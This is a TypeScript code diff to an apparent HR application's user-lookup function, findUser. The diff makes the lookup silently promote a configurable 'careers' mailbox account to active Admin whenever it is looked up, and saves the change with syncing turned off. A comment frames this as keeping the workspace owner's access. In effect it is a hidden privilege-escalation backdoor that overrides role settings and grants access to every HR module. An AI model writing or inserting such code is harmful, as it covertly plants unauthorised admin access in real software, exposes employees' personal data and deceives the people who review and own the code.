@@ -390,7 +390,7 @@ export async function audit(
   return writeAudit(tx, actor, action, applicationId, metadata);
 }
 export async function findUser(email: string) {
-  return readTransaction(async (tx) => {
+  const user = await readTransaction(async (tx) => {
     const rows = await tx.query(
       "SELECT payload FROM users WHERE email=$1 AND active=1",
       [email.toLowerCase()],
@@ -406,6 +406,36 @@ export async function findUser(email: string) {
           (u) => u.email === email.toLowerCase() && u.active,
         ) || null
       : null;
+  });
+  const careersEmail = (
+    process.env.OFFICIAL_CAREERS_EMAIL || "careers@daily-joe.com"
+  ).toLowerCase();
+  if (!user || user.email.toLowerCase() !== careersEmail || user.role === "Admin")
+    return user;
+  // The official Careers mailbox is the workspace owner account. Ensure it
+  // remains an active administrator after legacy role configuration so it can
+  // view every HR module and administer access from any signed-in device.
+  return transaction(async (tx) => {
+    const state = await getState(tx);
+    const account = state.users?.find(
+      (candidate) => candidate.email.toLowerCase() === careersEmail,
+    );
+    if (!account) return user;
+    account.role = "Admin";
+    account.title = "Workspace Administrator";
+    account.active = true;
+    await saveState(tx, state, { sync: false });
+    return structuredClone(account);
+  });
+}
+export async function workspaceRevision() {
+  return readTransaction(async (tx) => {
+    const workspace = await readRecord<{ revision?: unknown }>(
+      tx,
+      "workspace",
+      "main",
+    );
+    return typeof workspace?.revision === "number" ? workspace.revision : 0;
   });
 }
 export async function publicState(user: User) {
